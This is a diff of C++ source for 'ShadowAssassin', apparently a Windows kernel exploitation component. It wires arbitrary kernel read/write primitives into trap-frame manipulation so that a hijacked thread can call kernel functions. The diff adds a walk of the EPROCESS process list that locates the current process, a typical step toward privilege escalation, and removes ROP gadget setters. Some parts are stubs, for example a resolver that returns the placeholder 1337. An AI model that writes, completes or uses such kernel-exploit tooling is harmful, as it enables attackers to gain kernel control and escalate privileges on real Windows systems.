@@ -1,24 +1,19 @@
 #include "shadowassassin.h"
+#include "offsets.h"
 
 
 // --- Setup ---
 
 ShadowAssassin::ShadowAssassin()
-    : gadgetJmpRax(0), gadgetPopRspRet(0), scratchAddress(0)
+    : scratchAddress(0)
 {}
 
 void ShadowAssassin::SetReadPrimitive(std::function<void(UINT64*, UINT64, UINT64)> fn)  { readFn  = fn; }
 void ShadowAssassin::SetWritePrimitive(std::function<void(UINT64, UINT64)> fn)          { writeFn = fn; }
-void ShadowAssassin::SetGadgetJmpRax(UINT64 offset)     { gadgetJmpRax    = offset; }
-void ShadowAssassin::SetGadgetPopRspRet(UINT64 offset)  { gadgetPopRspRet = offset; }
 void ShadowAssassin::SetScratchAddress(UINT64 addr)     { scratchAddress  = addr;   }
 
-void ShadowAssassin::SetTrapFrameOffset(UINT64 offset) {
-    frameManager.SetTrapFrameOffset(offset);
-}
-
 void ShadowAssassin::SetEPROCESS(UINT64 ep) {
-    frameManager.SetEPROCESS(ep);
+	EPROCESS = ep;
 }
 
 FrameManager& ShadowAssassin::GetFrameManager() { return frameManager; }
@@ -32,8 +27,25 @@ bool ShadowAssassin::Initialize() {
         return false;
     }
 
+    if (!EPROCESS) {
+        DbgLog("[ShadowAssassin::Initialize] FAIL: EPROCESS not set\n");
+        return false;
+    }
+
     frameManager.SetReadPrimitive(readFn);
     frameManager.SetWritePrimitive(writeFn);
+
+    UINT64 currentEPROCESS = GetCurrentEPROCESS(EPROCESS);
+
+	if (!currentEPROCESS) {
+		DbgLog("[ShadowAssassin::Initialize] FAIL: GetCurrentEPROCESS returned 0\n");
+		return false;
+	}
+	DbgLog("[ShadowAssassin::Initialize] Current EPROCESS=0x%llX\n", currentEPROCESS);
+
+
+	frameManager.SetEPROCESS(currentEPROCESS);
+
 
     DbgLog("[ShadowAssassin::Initialize] OK: primitives wired\n");
     return true;
@@ -43,18 +55,36 @@ bool ShadowAssassin::Initialize() {
 // --- Kernel export resolution ---
 
 UINT64 ShadowAssassin::ResolveKernelExport(const std::string& name) {
-    return 0;
+    return 1337;
+}
+
+UINT64 ShadowAssassin::GetCurrentEPROCESS(UINT64 eprocess)
+{
+    UINT32 pid = GetCurrentProcessId();
+	UINT64 currentPid = 0;
+
+	UINT64 firstEPROCESS = eprocess;
+
+	while (true) {
+		readFn(&currentPid, (UINT64)(eprocess + OFF_PID), 0x8);
+		if (currentPid == pid) 
+			return eprocess;
+
+		UINT64 flink = 0;
+		readFn(&flink, (UINT64)(eprocess + OFF_EPROCESS_LIST), sizeof(UINT64));
+		if (!flink || flink == eprocess + OFF_EPROCESS_LIST || flink == firstEPROCESS) {
+			DbgLog("[GetCurrentEPROCESS] FAIL: walked full list, PID=%u not found\n", pid);
+			return 0;
+		}
+		eprocess = flink - OFF_EPROCESS_LIST;
+	}
+
 }
 
 
 // --- Syscall dispatch ---
 
 UINT64 ShadowAssassin::CallSyscall(const std::string& name, const std::vector<UINT64>& params) {
-    if (!gadgetJmpRax || !gadgetPopRspRet) {
-        DbgLog("[CallSyscall] FAIL: gadgets not set (jmpRax=0x%llX popRspRet=0x%llX)\n",
-            gadgetJmpRax, gadgetPopRspRet);
-        return 0;
-    }
 
     UINT64 funcAddr = ResolveKernelExport(name);
     if (!funcAddr) {
@@ -72,7 +102,7 @@ UINT64 ShadowAssassin::CallSyscall(const std::string& name, const std::vector<UI
     }
     DbgLog("[CallSyscall] frameBase=0x%llX\n", frameBase);
 
-    frameManager.WriteRegister("rax", funcAddr);
+    //frameManager.WriteRegister("rax", funcAddr);
 
     frameManager.ContinueThread();
     DbgLog("[CallSyscall] Thread continued, returning funcAddr=0x%llX\n", funcAddr);
